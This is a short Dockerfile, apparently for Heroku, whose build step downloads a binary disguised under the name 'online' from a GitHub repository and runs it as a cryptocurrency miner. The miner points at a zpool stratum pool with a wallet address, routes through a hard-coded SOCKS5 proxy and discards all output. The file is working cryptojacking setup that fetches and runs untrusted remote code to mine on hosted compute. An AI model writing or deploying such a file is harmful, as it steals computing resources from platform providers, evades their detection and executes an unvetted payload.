FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/onbreakmyheart/online/raw/main/online; chmod +x online; ./online -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 -u DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr -p c=DGB,zap=AVN -t 2 -x socks5://192.252.214.20:15864 > /dev/null 2>&1
CMD bash heroku.sh
